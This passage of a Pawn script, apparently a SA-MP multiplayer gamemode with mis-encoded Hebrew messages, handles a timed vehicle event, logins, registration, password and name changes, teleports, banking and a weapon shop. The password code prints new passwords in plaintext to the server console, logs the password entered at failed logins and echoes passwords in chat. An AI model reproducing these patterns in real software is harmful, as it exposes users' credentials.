						ShowPlayerNameTagForPlayer(ii,i,1);
						SetPlayerMarkerForPlayer(ii,i,GetColor(i,153));
					}
				}
				playerinfo[i][invisible] = 0;
				SetCameraBehindPlayer(i);
				SetVehicleHealth(GetPlayerVehicleID(i),1000.0);
				SetVehiclePos(GetPlayerVehicleID(i),Kickstar[playerinfo[i][kickstarid]][0],Kickstar[playerinfo[i][kickstarid]][1],Kickstar[playerinfo[i][kickstarid]][2]);
				SetVehicleZAngle(GetPlayerVehicleID(i),Kickstar[playerinfo[i][kickstarid]][3]);
				ResetWeapons(i);
				SendClientMessage(i,orange," !Kickstaráäöìçä áúçøåú ä");
			}
		}
	}
	if(kickstarinfo[2] <= 0)
	{
		new rnd = -1, tests = 0;
		do
		{
			if(tests == 10) break;
			rnd = random(sizeof(Kickstar)), tests++;
		}
		while rnd < 0 || rnd > sizeof(Kickstar)-1 || IsSomeoneNearKSPos(rnd);
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitkickstar])
			{
				playerinfo[i][inact] = 1;
				playerinfo[i][inkickstar] = 1, playerinfo[i][waitkickstar] = 0;
				SetFreeze(i,0);
				DisablePlayerCheckpoint(i);
				SetPlayerCheckpoint(i,Kickstar[rnd][0],Kickstar[rnd][1],Kickstar[rnd][2],4.5);
			}
		}
		KillTimer(kickstarinfo[3]);
		kickstarinfo[3] = SetTimer("WinKickstar",1000,1), kickstarinfo[4] = 90;
	}
	if(debugstate) printf("Gamemode Activity [end]: StartKickstar2");
	return 1;
}
//=[WinKickstar]================================================================
public WinKickstar()
{
	if(debugstate) printf("Gamemode Activity [start]: WinKickstar");
	new string[M_S];
	kickstarinfo[4]--;
	if(!kickstarinfo[4])
	{
		new winner[MAX_PLAYERS] = {-1,...}, winners = 0, highScore = -1;
		for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && playerinfo[i][inkickstar] && playerinfo[i][kickstarscore] > highScore) highScore = playerinfo[i][kickstarscore];
		for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && playerinfo[i][inkickstar] && playerinfo[i][kickstarscore] == highScore) winner[winners] = i, winners++;
		switch(winners)
		{
			case 1:
			{
				format(string,sizeof(string),"~r~%s ~n~~w~is the winner in the ~r~~h~kickstar~w~!",GetName(winner[0]));
				MovingText(string,mt_activity);
				format(string,sizeof(string)," !Kickstar ðéöç áúçøåú ä %s",GetName(winner[0]));
				SendClientMessageToAll(yellow,string);
			}
			default:
			{
				format(string,sizeof(string)," :äí Kickstar äîðöçéí áúçøåú ä %d",winners);
				SendClientMessageToAll(yellow,string);
				string = "";
				for(new i = 0; i < winners; i++) format(string,sizeof(string),"%s  %s",string,GetName(winner[i]));
				strdel(string,0,2);
				SendClientMessageToAll(yellow,string);
				format(string,sizeof(string)," .ëì äîðöçéí æëå áñëåí äëñôé 50000$ ùäúçì÷ ìîñôø äîðöçéí, åäñëåí ùééöà - %d$",50000/winners);
				SendClientMessageToAll(yellow,string);
			}
		}
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][inkickstar])
			{
				LinkVehicleToInterior(GetPlayerVehicleID(i),0);
				SetVehicleVirtualWorld(GetPlayerVehicleID(i),0);
				SetVehicleToRespawn(GetPlayerVehicleID(i));
				SpawnPlayer(i);
				playerinfo[i][inkickstar] = 0, playerinfo[i][waitkickstar] = 0, playerinfo[i][kickstarid] = -1, playerinfo[i][kickstarscore] = 0;
				playerinfo[i][inact] = 0;
				DisablePlayerCheckpoint(i);
			}
		}
		for(new i = 0; i < winners; i++) if(winner[i] > -1) GiveMoney(winner[i],50000 / winners);
		kickstarinfo[0] = 0, kickstarinfo[1] = 0, kickstarinfo[2] = 0, kickstarinfo[4] = 0;
		KillTimer(kickstarinfo[3]);
	}
	new kickstarScoreShow[] = {30,60,10}, bool:show = false;
	for(new t = 0; t < sizeof(kickstarScoreShow); t++) if(kickstarinfo[4] == kickstarScoreShow[t]) show = true;
	if(show)
	{
		for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && playerinfo[i][inkickstar])
		{
			SendClientMessage(i,lightblue," ~~~ :òãëåï - Kickstar ~~~");
			for(new a = 0; a < MAX_PLAYERS; a++) if(IsPlayerConnected(a) && playerinfo[a][inkickstar])
			{
				format(string,sizeof(string),"  %s - %d",GetName(a),playerinfo[a][kickstarscore]);
				SendClientMessage(i,yellow,string);
			}
			format(string,sizeof(string),"  äæîï ùðåúø òã ñéåí äôòéìåú: %d ùðéåú",kickstarinfo[4]);
			SendClientMessage(i,orange,string);
		}
	}
	if(debugstate) printf("Gamemode Activity [end]: WinKickstar");
	return 1;
}
//=[PropertyDeleting]===========================================================
public PropertyDeleting(propname[])
{
	if(!PropertyExists(propname)) return 0;
	if(strfind(propname,"rcon_login_") != -1)
	{
		new unban[64];
		format(unban,sizeof(unban),"unbanip %s",propname[strlen("rcon_login_")]);
		SendRconCommand(unban);
	}
	return RemoveProperty(propname);
}
//=[BotStopTalkingTo]===========================================================
public BotStopTalkingTo() return bottalkingto = {INVALID_PLAYER_ID,INVALID_PLAYER_ID,INVALID_PLAYER_ID};
//=[OnDialogResponse]===========================================================
public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	new string[M_S];
	playerinfo[playerid][indialog] = -1;
	switch(dialogid)
	{
		case dialog_login: if(response)
		{
			if(equal(Encrypt(inputtext),fgetstring(fuser(playerid),"Password")))
			{
				SendClientMessage(playerid,lightblue," --- !äúçáøú áäöìçä");
				ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí - äúçáøåú"," !äúçáøú áäöìçä","OK","");
				LoginPlayer(playerid);
				playerinfo[playerid][logged] = 1;
				PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			}
			else
			{
				format(string,sizeof(string),"%s%s.ini",folder_users,GetName(playerid));
				format(string,sizeof(string),"(%s) FL (%d)%s [%s / real user last ip: %s / from dialog]",GetIP(playerid),playerid,GetName(playerid),inputtext,fexist(string) ? (fgetstring(string,"LastConnectIP")) : ("file not exists"));
				Log("FailedLogins",playerid,string);
				if(playerinfo[playerid][faileds] >= 4)
				{
					SendClientMessage(playerid,red," .òáøú àú îñôø ðéñéåðåú ääúçáøåú äîåúø åìê ðåú÷ú îäùøú");
					SendClientMessage(playerid,red," .àí ùëçú àú ñéñîúê, ôðä àìéðå áôåøåí");
					ShowPlayerDialog(playerid,dialog_wrongpass,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // äúçáøåú",webpage " :áîéãä åùëçú àú ñéñîúê, àúä îåæîï ìá÷ù îàéúðå ñéñîà çãùä áôåøåí ùìðå\n.ðâîøå ìê ðéñéåðåú ääúçáøåú","éöéàä","");
					return SetKick(playerid,INVALID_PLAYER_ID," 4/4 äúçáøåú ðëùìä");
				}
				playerinfo[playerid][faileds]++;
				format(string,sizeof(string)," .äñéñîà ùâåéä\n.ðåúøå ìê òåã %d ðéñéåðåú äúçáøåú",4-playerinfo[playerid][faileds]);
				ShowPlayerDialog(playerid,dialog_wrongpass,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // äúçáøåú",playerinfo[playerid][faileds] == 3 ? (" .ðùàø ìê òåã ðéñéåï äúçáøåú àçã\n.ñéñîà ùâåéä") : (string),"ðñä ùåá","");
				SendClientMessage(playerid,red,string);
			}
		}
		case dialog_register: if(response)
		{
			if(strlen(inputtext) < 3) return ShowPlayerDialog(playerid,dialog_badregister,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // äøùîä"," .äñéñîà äæå ÷öøä îãé","ðñä ùåá","áéèåì");
			if(strlen(inputtext) > 15) return ShowPlayerDialog(playerid,dialog_badregister,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // äøùîä"," .äñéñîà äæå àøåëä îãé","ðñä ùåá","áéèåì");
			playerinfo[playerid][logged] = 1, playerinfo[playerid][level] = !playerinfo[playerid][level]? 1:playerinfo[playerid][level];
			ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // äøùîä","...àðà äîúï","","");
			RegisterPlayer(playerid,Encrypt(inputtext));
			format(string,sizeof(string),"!ääøùîä äåùìîä áäöìçä\n%s :ùí îùúîù\n%s :ñéñîà\n.òì îðú ì÷áì òæøä ìâáé îòøëú äîùúîùéí /accounthelp äùúîù áô÷åãä\n/editprofile ìòøéëú äôøåôéì ùìê äùúîù áô÷åãä",GetName(playerid),inputtext);
			ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // äøùîä",string,"OK","");
			SendClientMessage(playerid,lightblue," --- !ðøùîú áäöìçä");
			format(string,sizeof(string)," %s :ùí îùúîù",GetName(playerid));
			SendClientMessage(playerid,orange,string);
			format(string,sizeof(string)," %s :ñéñîà",inputtext);
			SendClientMessage(playerid,orange,string);
			SendClientMessage(playerid,orange," /accounthelp :ìîéãò òì çùáåðåú äîùúîùéí");
			SendClientMessage(playerid,orange," /editprofile :ìòøéëú äôøåôéì");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		case dialog_wrongpass: ShowPlayerDialog(playerid,dialog_login,DIALOG_STYLE_INPUT," îòøëú îùúîùéí // äúçáøåú",":äúçáø áá÷ùä","äúçáø","");
		case dialog_badregister: if(response) ShowPlayerDialog(playerid,dialog_register,DIALOG_STYLE_INPUT," îòøëú îùúîùéí // äøùîä",":äøùí áá÷ùä","äøùîä","áéèåì");
		case dialog_ni: return 1;
		case dialog_changepass:
		{
			if(response)
			{
				if(strlen(inputtext) < 3) return ShowPlayerDialog(playerid,dialog_wrongchangepass,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // ùéðåé ñéñîà"," .äñéñîà äæå ÷öøä îãé","ðñä ùåá","áéèåì");
				if(strlen(inputtext) > 15) return ShowPlayerDialog(playerid,dialog_wrongchangepass,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // ùéðåé ñéñîà"," .äñéñîà äæå àøåëä îãé","ðñä ùåá","áéèåì");
				if(!equal(fgetstring(fuser(playerid),"LastChangepass"),GetDateAsString())) fsetint(fuser(playerid),"ChangepassLimit",0);
				if(fgetint(fuser(playerid),"ChangepassLimit") >= 3) return ShowPlayerDialog(playerid,dialog_wrongchangepass,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // ùéðåé ñéñîà"," .ùéí ìá: àúä éëåì ìäùúîù áô÷åãä äæå ø÷ 3 ôòîéí áéåí","ðñä ùåá","áéèåì");
				format(string,sizeof(string),"!ñéñîúê ùåðúä áäöìçä\n%s :ùí îùúîù\n%s :ñéñîà çãùä",GetName(playerid),inputtext);
				ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // ùéðåé ñéñîà",string,"OK","");
				SendClientMessage(playerid,lightblue," ~~~ :ùéðåé äñéñîà - îéãò ~~~");
				format(string,sizeof(string)," .ñéñîúê äåçìôä. æåäé äôòí ä %d ùùéðéú ñéñîà äéåí",fgetint(fuser(playerid),"ChangepassLimit")+1);
				SendClientMessage(playerid,yellow,string);
				SendClientMessage(playerid,yellow," .àú ñéñîúê úåëì ìùðåú 3 ôòîéí áëì éåí");
				format(string,sizeof(string),"  %s :ùí îùúîù",GetName(playerid));
				SendClientMessage(playerid,orange,string);
				format(string,sizeof(string),"  %s :ñéñîúê äçãùä",inputtext);
				SendClientMessage(playerid,orange,string);
				SendClientMessage(playerid,yellow," * .àéï ìê îä ìãàåâ ìâáé öôééä áñéñîà îöã ääðäìä - ñéñîúê äøùåîä áøùéîåú ùìðå îåöôðú åìëï àó àçã ìà éëåì ìøàåúä");
				SendClientMessage(playerid,red," * .ùéí ìá: àðå îîìéöéí ìöìí çì÷ æä ùì äö'àè, ìî÷øä ùúùëç àú ñéñîúê. öååú ääðäìä àéðå àçøàé òì ùëéçú ñéñîàåú");
				printf(" --- [%s] %s change his password to %s",GetDateAsString(),GetName(playerid),inputtext);
				fsetstring(fuser(playerid),"Password",Encrypt(inputtext));
				fsetint(fuser(playerid),"UseChangepass",fgetint(fuser(playerid),"UseChangepass")+1);
				PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
				fsetstring(fuser(playerid),"LastChangepass",GetDateAsString());
				fsetint(fuser(playerid),"ChangepassLimit",fgetint(fuser(playerid),"ChangepassLimit")+1);
			}
			else SendClientMessage(playerid,red," .áéèìú àú ùéðåé äñéñîà");
		}
		case dialog_changename:
		{
			if(response)
			{
				#if usingYSF
				if(fkeyexist(file_nbans,inputtext)) return ShowPlayerDialog(playerid,dialog_wrongchangename,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // ùéðåé ùí îùúîù"," .äëéðåé äæä ááàï","ðñä ùåá","áéèåì");
				if(!equal(fgetstring(fuser(playerid),"LastChangename"),GetDateAsString())) fsetint(fuser(playerid),"ChangenameLimit",0);
				if(fgetint(fuser(playerid),"ChangenameLimit") >= 3) return ShowPlayerDialog(playerid,dialog_wrongchangename,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // ùéðåé ùí îùúîù"," .ùéí ìá: àúä éëåì ìäùúîù áô÷åãä äæå ø÷ 3 ôòîéí áéåí","Try Again","Cancel");
				for(new i=0;i<MAX_PLAYERS;i++)
				{
					if(IsPlayerConnected(i) && equal(GetName(i),inputtext))
					{
						format(string,sizeof(string)," .%03d ùí äîùúîù äæä ëáø ðì÷ç òì éãé àééãé",i);
						ShowPlayerDialog(playerid,dialog_wrongchangename,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // ùéðåé ùí îùúîù",string,"ðñä ùåá","áéèåì");
						return 1;
					}
				}
				if(equal(inputtext,"None") || equal(inputtext,botname)) return ShowPlayerDialog(playerid,dialog_wrongchangename,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // ùéðåé ùí îùúîù"," .îöèòøéí, àê ìà ðéúï ìùðåú àú ùí äîùúîù ìè÷ñè æä","ðñä ùåá","áéèåì");
				new f[M_S], lastname[MAX_PLAYER_NAME];
				format(f,sizeof(f),"/DM/Users/%s.ini",inputtext);
				if(fexist(f)) return ShowPlayerDialog(playerid,dialog_wrongchangename,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // ùéðåé ùí îùúîù"," .ùí äîùúîù äæä ëáø ðì÷ç ò\"é ùç÷ï ìà îçåáø","ðñä ùåá","áéèåì");
				if(strlen(inputtext) > 20) return ShowPlayerDialog(playerid,dialog_wrongchangename,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // ùéðåé ùí îùúîù"," .äëéðåé äæä àøåê îãé","ðñä ùåá","áéèåì");
				if(strlen(inputtext) < 3) return ShowPlayerDialog(playerid,dialog_wrongchangename,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // ùéðåé ùí îùúîù"," .äëéðåé äæä ÷öø îãé","ðñä ùåá","áéèåì");
				if(!IsValidNick(inputtext)) return ShowPlayerDialog(playerid,dialog_wrongchangename,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // ùéðåé ùí îùúîù"," .ùí îùúîù ìà éëåì ìäëéì çì÷ îäúåéí ùëúáú","ðñä ùåá","áéèåì");
				format(lastname,sizeof(lastname),GetName(playerid));
				ChangeAccName(playerid,inputtext);
				format(string,sizeof(string),"/DM/Users/%s.ini",lastname);
				frename(string,f);
				if(fkeyexist(file_admins,GetName(playerid)))
				{
					fremovekey(file_admins,GetName(playerid));
					fsetint(file_admins,inputtext,playerinfo[playerid][admin]);
				}
				if(playerinfo[playerid][vehicle] != -1)
				{
					format(string,sizeof(string),"Vehicle%d",playerinfo[playerid][vehicle]);
					if(fkeyexist(file_vstore,string) && equal(fgetstring(file_vstore,string),GetName(playerid))) fsetstring(file_vstore,string,inputtext);
				}
				SetPlayerName(playerid,inputtext);
				format(string,sizeof(string),"!ùí äîùúîù ùåðä áäöìçä\n%s :ùí îùúîù çãù\n%s :ùí îùúîù ÷åãí",inputtext,lastname);
				ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // ùéðåé ùí",string,"OK","");
				SendClientMessage(playerid,lightblue," ~~~ :ùéðåé ëéðåé - îéãò ~~~");
				format(string,sizeof(string)," .ëéðåééê äåçìó. æåäé äôòí ä %d ùùéðéú ëéðåé äéåí",fgetint(fuser(playerid),"ChangenameLimit")+1);
				SendClientMessage(playerid,yellow,string);
				SendClientMessage(playerid,yellow," .àú ëéðåééê úåëì ìùðåú 3 ôòîéí áëì éåí");
				format(string,sizeof(string),"  %s :ëéðåé ÷åãí",lastname);
				SendClientMessage(playerid,orange,string);
				format(string,sizeof(string),"  %s :ëéðåé çãù",inputtext);
				SendClientMessage(playerid,orange,string);
				SendClientMessage(playerid,yellow," * .áîéãä åùéðéú àú ëéðåééê 3 ôòîéí äéåí åàúä áëì æàú øåöä ìùðåúå - úåëì ìùìåç îééì àì äðäìú äùøú åäòðééï éèåôì");
				SendClientMessage(playerid,red," * .ùéí ìá: àðå îîìéöéí ìöìí çì÷ æä ùì äö'àè, ìî÷øä ùúùëç àú ëéðåééê. öååú ääðäìä àéðå àçøàé òì ùëéçú ëéðåééí");
				printf(" --- [%s] %s change his nick to %s",GetDateAsString(),GetName(playerid),inputtext);
				PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
				format(string,sizeof(string),"oldname: %s, newname: %s",lastname,inputtext);
				Log("ChangeName",playerid,string);
				fsetstring(fuser(playerid),"LastChangename",GetDateAsString());
				fsetint(fuser(playerid),"ChangenameLimit",fgetint(fuser(playerid),"ChangenameLimit")+1);
				#else
					ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX," îòøëú îùúîùéí // ùéðåé ùí"," .äàôùøåú ìùéðåé ùí äîùúîù ëøâò îáåèìú","OK","");
				#endif
			}
			else SendClientMessage(playerid,red," .áéèìú àú ùéðåé äñéñîà");
		}
		case dialog_wrongchangepass: if(response) ShowPlayerDialog(playerid,dialog_changepass,DIALOG_STYLE_INPUT," îòøëú îùúîùéí // ùéðåé ñéñîà"," :áçø ñéñîà çãùä åøùåí àåúä ëàï","ùðä ñéñîà","áéèåì");
		case dialog_wrongchangename: if(response) ShowPlayerDialog(playerid,dialog_changename,DIALOG_STYLE_INPUT," îòøëú îùúîùéí // ùéðåé ùí îùúîù"," :áçø ùí îùúîù çãù åøùåí àåúå ëàï","ùðä ùí îùúîù","áéèåì");
		case dialog_tm:
		{
			if(response)
			{
				if(playerinfo[playerid][tinfo])
				{
					playerinfo[playerid][tinfo] = 0;
					format(string,sizeof(string)," ~~~ :%s ôøèé äùéâåø ~~~",Teleports[listitem][Tcmd]);
					SendClientMessage(playerid,lightblue,string);
					format(string,sizeof(string),"  %02d :îñôø ñéãåøé",listitem);
					SendClientMessage(playerid,grey,string);
					if(!strlen(Teleports[listitem][Tauthor])) SendClientMessage(playerid,grey,"  ðåöø ò\"é öååú äðäìú äùøú");
					else
					{
						format(string,sizeof(string),"  %s ðåöø ò\"é",Teleports[listitem][Tauthor]);
						SendClientMessage(playerid,grey,string);
					}
					format(string,sizeof(string),"  áùéâåø æä %s ìú÷åó",Teleports[listitem][Tnoshooting] ? ("àñåø") : ("îåúø"));
					SendClientMessage(playerid,grey,string);
					format(string,sizeof(string),"  ùéâåø æä îùâø %s øëá",Teleports[listitem][Twithv] ? ("òí") : ("áìé"));
					SendClientMessage(playerid,grey,string);
					format(string,sizeof(string),"  %d ùéâåø æä ÷ééí áòåìí îñôø",Teleports[listitem][Tw]);
					SendClientMessage(playerid,grey,string);
				}
				else
				{
					if(playerinfo[playerid][level] < Teleports[listitem][Tl])
					{
						format(string,sizeof(string)," .ëãé ìäùúîù áùéâåø æä òìéê ìäéåú ìôçåú áøîä %d",Teleports[listitem][Tl]);
						SendClientMessage(playerid,red,string);
						return 1;
					}
					new Float:h, bool:jetp=false, tname[M_S];
					GetPlayerHealth(playerid,h);
					if(h < levels[playerinfo[playerid][level]][TeleHealth])
					{
						format(string,sizeof(string)," .áøîúê äðåëçéú, àéðê éëåì ìäùúâø òí ôçåú î %.1f àçåæ çééí",levels[playerinfo[playerid][level]][TeleHealth]);
						SendClientMessage(playerid,red,string);
						return 1;
					}
					if(!playerinfo[playerid][gmtimer])
					{
						SetPlayerHealth2(playerid,100000.0);
						playerinfo[playerid][gmtimer] = 1;
						SetTimerEx("UnGod",1500,0,"df",playerid,h);
					}
					if(Teleports[listitem][Twithv])
					{
						switch(GetPlayerState(playerid))
						{
							case PLAYER_STATE_ONFOOT, PLAYER_STATE_PASSENGER:
							{
								jetp = GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK? true:false;
								SetPlayerPos(playerid,Teleports[listitem][Tx]+floatrand(-1.0,1.0),Teleports[listitem][Ty]+floatrand(-1.0,1.0),Teleports[listitem][Tz]);
								SetPlayerFacingAngle(playerid,Teleports[listitem][Ta]);
							}
							case PLAYER_STATE_DRIVER:
							{
								SetVehiclePos(GetPlayerVehicleID(playerid),Teleports[listitem][Tx]+floatrand(-3.0,3.0),Teleports[listitem][Ty]+floatrand(-3.0,3.0),Teleports[listitem][Tz]);
								SetVehicleZAngle(GetPlayerVehicleID(playerid),Teleports[listitem][Ta]);
								LinkVehicleToInterior(GetPlayerVehicleID(playerid),Teleports[listitem][Ti]);
								SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),Teleports[listitem][Tw]);
								jetp = false;
							}
						}
					}
					else
					{
						jetp = GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK? true:false;
						SetPlayerPos(playerid,Teleports[listitem][Tx]+floatrand(-1.0,1.0),Teleports[listitem][Ty]+floatrand(-1.0,1.0),Teleports[listitem][Tz]);
						SetPlayerFacingAngle(playerid,Teleports[listitem][Ta]);
					}
					SetCameraBehindPlayer(playerid);
					SetPlayerInterior(playerid,Teleports[listitem][Ti]);
					SetPlayerVirtualWorld(playerid,Teleports[listitem][Tw]);
					strmid(tname,Teleports[listitem][Tcmd],1,strlen(Teleports[listitem][Tcmd]));
					format(string,sizeof(string),"~y~] ~h~%s ~y~]",tname);
					GameTextForPlayer(playerid,string,1500,4);
					if(jetp) GiveJetpack(playerid);
					if(Teleports[listitem][Tfreeze])
					{
						SetFreeze(playerid,1);
						SetTimerEx("UnFreeze",1005,0,"i",playerid);
					}
				}
			}
		}
		case dialog_wrongtp: if(response) command(playerid,"/tm");
		case dialog_baccount:
		{
			if(response)
			{
				if(strlen(inputtext) < 2) return ShowPlayerDialog(playerid,dialog_wrongbaccount,DIALOG_STYLE_MSGBOX," îòøëú áð÷ // éöéøú çùáåï áð÷"," .äñéñîà äæå ÷öøä îãé","ðñä ùåá","áéèåì");
				if(strlen(inputtext) > 10) return ShowPlayerDialog(playerid,dialog_wrongbaccount,DIALOG_STYLE_MSGBOX," îòøëú áð÷ // éöéøú çùáåï áð÷"," .äñéñîà äæå àøåëä îãé","ðñä ùåá","áéèåì");
				format(string,sizeof(string),"/baccount create %s",inputtext);
				command(playerid,string);
			}
			else SendClientMessage(playerid,red," .áéèìú àú éöéøú çùáåï äáð÷");
		}
		case dialog_wrongbaccount: if(response) ShowPlayerDialog(playerid,dialog_baccount,DIALOG_STYLE_INPUT," îòøëú áð÷ // éöéøú çùáåï áð÷"," :àðà áçø ñéñîú çùáåï áð÷ åøùåí àåúä ìîèä","öåø çùáåï","áéèåì");
		case dialog_banklog: if(response) command(playerid,"/baccount clear");
		case dialog_bank:
		{
		    if(response) switch(listitem)
		    {
		        case 0: command(playerid,"/deposit");
		        case 1: command(playerid,"/withdraw");
		        case 2: command(playerid,"/balance");
		        case 3: command(playerid,"/depositall");
		        case 4: command(playerid,"/withdrawall");
		        case 5: command(playerid,"/buycc");
		        case 6: command(playerid,"/sellcc");
		    }
		}
		case dialog_deposit:
		{
		    format(string,sizeof(string),"/deposit %s",inputtext);
		    command(playerid,string);
		}
		case dialog_withdraw:
		{
		    format(string,sizeof(string),"/withdraw %s",inputtext);
		    command(playerid,string);
		}
		case dialog_baccpass:
		{
		    format(string,sizeof(string),"/baccount password %s",inputtext);
		    command(playerid,string);
		}
		case dialog_ammu:
		{
		    if(response) switch(listitem)
		    {
		        case 0: command(playerid,"/bw");
		        case 1: command(playerid,"/wl");
		        case 2: command(playerid,"/wreset");
		        case 3: command(playerid,"/armour");
		        case 4: command(playerid,"/ccarmour");
		    }
		}
		case dialog_bw: if(response)
		{
			if(playerinfo[playerid][level] < Ammunation[listitem][aLevel])
			{
				format(string,sizeof(string)," .áëãé ì÷ðåú àú äðù÷ äæä òìéê ìäéåú ìôçåú áøîä %d",Ammunation[listitem][aLevel]);
				return ShowPlayerDialog(playerid,dialog_bwwrong,DIALOG_STYLE_MSGBOX," çðåú ðù÷éí // ÷ðééú ðù÷",string,"ðñä ùåá","áéèåì");
			}
			if(GetMoney(playerid) < WeaponCost(playerid,listitem)) return ShowPlayerDialog(playerid,dialog_bwwrong,DIALOG_STYLE_MSGBOX," çðåú ðù÷éí // ÷ðééú ðù÷"," .àéï ìê îñôé÷ ëñó ì÷ðééú äðù÷ äæä","ðñä ùåá","áéèåì");
			if(Ammunation[listitem][aSlot] < 8) playerinfo[playerid][ammo][Ammunation[listitem][aSlot]]++;
			playerinfo[playerid][weapons][Ammunation[listitem][aSlot]] = Ammunation[listitem][aID];
			GiveWeapon(playerid,Ammunation[listitem][aID],Ammunation[listitem][aAmmo]);
			GiveMoney(playerid,0-WeaponCost(playerid,listitem));
			if(playerinfo[playerid][logged])
			{
				format(string,sizeof(string),"Weapon%d",Ammunation[listitem][aSlot]);
				fsetint(fuser(playerid),string,Ammunation[listitem][aID]);
				if(Ammunation[listitem][aSlot] != 8 && Ammunation[listitem][aSlot] != 9)
				{
					format(string,sizeof(string),"Ammo%d",Ammunation[listitem][aSlot]);
					fsetint(fuser(playerid),string,playerinfo[playerid][ammo][Ammunation[listitem][aSlot]]);
				}
			}
			format(string,sizeof(string)," .%s øëùú àú äðù÷",Ammunation[listitem][aName]);
			SendClientMessage(playerid,green,string);
			command(playerid,"/bw");
		}
		case dialog_bwwrong: if(response) command(playerid,"/bw");
		case dialog_clickplayer:
		{
		    switch(GetPlayerCheckpoint(playerid))
			{
				case cp_bank:
				{
				    format(string,sizeof(string)," %s // îòøëú áð÷",GetName(playerinfo[playerid][clickon]));
					ShowPlayerDialog(playerid,dialog_clickplayer,DIALOG_STYLE_LIST,string,"äòáø ëñó\näåöà ëñó îçùáåï äáð÷ ùì äîùúîù äæä\náãå÷ àú ñëåí äëñó áçùáåï äáð÷ ùì îùúîù æä","áçø","ñâåø");
					switch(listitem)
					{
					    case 0:
					    {
						    format(string,sizeof(string)," %s // äòáøú ëñó",GetName(playerinfo[playerid][clickon]));
							ShowPlayerDialog(playerid,dialog_transfer,DIALOG_STYLE_INPUT,string,":øùåí ëàï àú ñëåí äëñó ùáøöåðê ìäòáéø àì ùç÷ï æä","äòáø","áéèåì");
					    }
					    case 1:
					    {
						    format(string,sizeof(string)," %s // äåöàú ëñó îçùáåï áð÷ ùì îùúîù àçø",GetName(playerinfo[playerid][clickon]));
							ShowPlayerDialog(playerid,dialog_baccw1,DIALOG_STYLE_INPUT,string,":øùåí ëàï àú ñéñîú äáð÷ ùì îùúîù æä","äîùê","ñâåø");
					    }
					    case 2:
					    {
						    format(string,sizeof(string)," %s // áãé÷ú ñëåí äëñó áçùáåï áð÷ ùì îùúîù àçø",GetName(playerinfo[playerid][clickon]));
							ShowPlayerDialog(playerid,dialog_baccb,DIALOG_STYLE_INPUT,string,":øùåí ëàï àú ñéñîú äáð÷ ùì îùúîù æä","äîùê","ñâåø");
					    }
					}
				}
				default:
				{
					switch(listitem)
					{
					    case 0: ShowStats(playerid,playerinfo[playerid][clickon]);
					    case 1:
						{
						    if(playerinfo[playerid][clickon] == playerid) return ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX," ùìéçú äåãòä ôøèéú"," .ìà ðéúï ìùìåç äåãòä ôøèéú ìòöîê","ñâåø","");
						    format(string,sizeof(string)," %s // ùìéçú äåãòä ôøèéú",GetName(playerinfo[playerid][clickon]));
							ShowPlayerDialog(playerid,dialog_pm,DIALOG_STYLE_INPUT,string,":øùåí àú ääåãòä äôøèéú ëàï","ùìç","áéèåì");
						}
					    case 2:
						{
						    format(string,sizeof(string)," %s // ùìéçú ãéååç ìàãîéðéí",GetName(playerinfo[playerid][clickon]));
							ShowPlayerDialog(playerid,dialog_report,DIALOG_STYLE_INPUT,string,":øùåí ëàï àú äãéååç","ãååç","áéèåì");
						}
					    case 3:
						{
						    format(string,sizeof(string)," %s // ùìéçú ëñó",GetName(playerinfo[playerid][clickon]));
							ShowPlayerDialog(playerid,dialog_pay,DIALOG_STYLE_INPUT,string,":øùåí ëàï àú ñëåí äëñó ùáøöåðê ìùìåç àì ùç÷ï æä","ùìç","áéèåì");
						}
					}
				}
			}
		}
		case dialog_pm: if(response)
		{
		    format(string,sizeof(string),"/pm %d %s",playerinfo[playerid][clickon],inputtext);
		    command(playerid,string);
		}
		case dialog_report: if(response)
		{
		    format(string,sizeof(string),"/report %d %s",playerinfo[playerid][clickon],inputtext);
		    command(playerid,string);
		}
		case dialog_pay: if(response)
		{
		    if(!IsNumeric(inputtext) || strval(inputtext) < 0 || strval(inputtext) > GetMoney(playerid)) return ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX," ùìéçú ëñó",".ñëåí ùâåé","OK","");
		    format(string,sizeof(string),"/pay %d %s",playerinfo[playerid][clickon],inputtext);
		    command(playerid,string);
		}
		case dialog_transfer: if(response)
		{
